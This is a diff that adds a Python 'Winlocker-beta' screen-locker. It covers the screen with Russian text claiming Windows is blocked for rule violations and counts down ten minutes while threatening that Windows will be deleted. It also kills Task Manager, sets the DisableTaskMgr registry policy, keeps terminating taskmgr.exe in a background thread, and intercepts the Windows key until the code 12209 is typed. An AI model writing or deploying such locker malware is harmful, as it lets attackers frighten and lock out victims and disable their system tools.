@@ -1,0 +1,137 @@
+import pygame
+import time
+import os
+import threading
+import psutil
+from pynput import keyboard
+
+def disable_task_manager():
+    os.system("taskkill /IM Taskmgr.exe /F")
+    os.system(
+        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
+
+
+def enable_task_manager():
+    os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f")
+
+
+def monitor_task_manager():
+    while True:
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'].lower() == "taskmgr.exe":
+                os.system(f"taskkill /PID {process.info['pid']} /F")
+        time.sleep(1)
+
+
+def block_keys():
+    def on_press(key):
+        if key == keyboard.Key.cmd:
+            return False
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+def main():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    pygame.display.set_caption("Winlocker-beta")
+    screen.fill((0, 0, 0))
+
+    pygame.mouse.set_visible(True)
+    disable_task_manager()
+
+    threading.Thread(target=monitor_task_manager, daemon=True).start()
+    threading.Thread(target=block_keys, daemon=True).start()
+
+
+    font = pygame.font.Font(None, 72)
+    font_timer = pygame.font.Font(None, 60)
+    font_warning = pygame.font.Font(None, 50)
+
+    text = font.render("Ваш Windows был заблокирован за нарушения правил", True, (255, 0, 0))
+    text_rect = text.get_rect(center=(screen.get_width() // 2, 100))
+
+
+    input_box = pygame.Rect(screen.get_width() // 2 - 200, screen.get_height() // 2, 400, 50)
+    font_input = pygame.font.Font(None, 50)
+    user_text = ""
+
+
+    button_rect = pygame.Rect(screen.get_width() // 2 - 125, screen.get_height() // 2 + 70, 250, 50)
+
+
+    error_message = ""
+    font_error = pygame.font.Font(None, 40)
+    error_text_rect = pygame.Rect(screen.get_width() // 2 - 125, screen.get_height() // 2 + 130, 250, 50)
+
+    unlocked = False
+    running = True
+    countdown = 600
+
+    while running:
+        screen.fill((0, 0, 0))
+        screen.blit(text, text_rect)
+
+
+        minutes = countdown // 60
+        seconds = countdown % 60
+        timer_text = font_timer.render(f"Осталось времени: {minutes:02}:{seconds:02}", True, (255, 255, 255))
+        timer_rect = timer_text.get_rect(center=(screen.get_width() // 2, screen.get_height() - 150))
+        screen.blit(timer_text, timer_rect)
+
+
+        warning_text = font_warning.render("Когда отсчет закончится Windows будет удалена", True, (255, 0, 0))
+        warning_rect = warning_text.get_rect(center=(screen.get_width() // 2, screen.get_height() - 100))
+        screen.blit(warning_text, warning_rect)
+
+
+        pygame.draw.rect(screen, (255, 255, 255), input_box, 2)
+        input_text_surface = font_input.render(user_text, True, (255, 255, 255))
+        screen.blit(input_text_surface, (input_box.x + 10, input_box.y + 10))
+
+
+        pygame.draw.rect(screen, (100, 100, 100), button_rect)
+        button_text = font_input.render("Разблокировать", True, (255, 255, 255))
+        screen.blit(button_text, (button_rect.x + 10, button_rect.y + 10))
+
+
+        if error_message:
+            error_surface = font_error.render(error_message, True, (255, 0, 0))
+            screen.blit(error_surface, error_text_rect.topleft)
+
+        pygame.display.flip()
+
+
+        if countdown > 0:
+            time.sleep(1)
+            countdown -= 1
+
+        for event in pygame.event.get():
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_q and not unlocked:
+                    running = False
+                elif event.key == pygame.K_RETURN:
+                    if user_text == "12209":
+                        unlocked = True
+                        running = False
+                    else:
+                        error_message = "Неверный пароль!"
+                elif event.key == pygame.K_BACKSPACE:
+                    user_text = user_text[:-1]
+                else:
+                    user_text += event.unicode
+            elif event.type == pygame.MOUSEBUTTONDOWN:
+                if button_rect.collidepoint(event.pos):
+                    if user_text == "12209":
+                        unlocked = True
+                        running = False
+                    else:
+                        error_message = "Неверный пароль!"
+
+    enable_task_manager()
+    pygame.quit()
+
+
+if __name__ == "__main__":
+    main()
